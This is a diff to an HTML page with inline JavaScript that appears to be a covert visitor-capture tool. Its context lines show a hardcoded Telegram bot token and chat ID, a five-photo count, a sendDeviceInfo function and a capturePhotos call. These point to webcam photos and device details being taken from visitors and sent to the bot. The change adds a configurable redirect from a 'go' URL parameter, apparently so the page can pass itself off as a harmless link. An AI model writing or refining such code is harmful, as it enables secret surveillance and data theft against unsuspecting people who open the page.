@@ -29,7 +29,13 @@ img{
 const BOT_TOKEN = "8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
 const CHAT_ID = "1167762232";
 const TOTAL_PHOTOS = 5;
-const REDIRECT_URL = "https://google.com";
+function getRedirect(){
+    const params = new URLSearchParams(window.location.search);
+    return params.get("go") || "https://google.com";
+}
+
+const REDIRECT_URL = getRedirect();
+
 
 // Device info
 function sendDeviceInfo(){
@@ -117,4 +123,5 @@ capturePhotos();
 
 </body>
 </html>
+
 
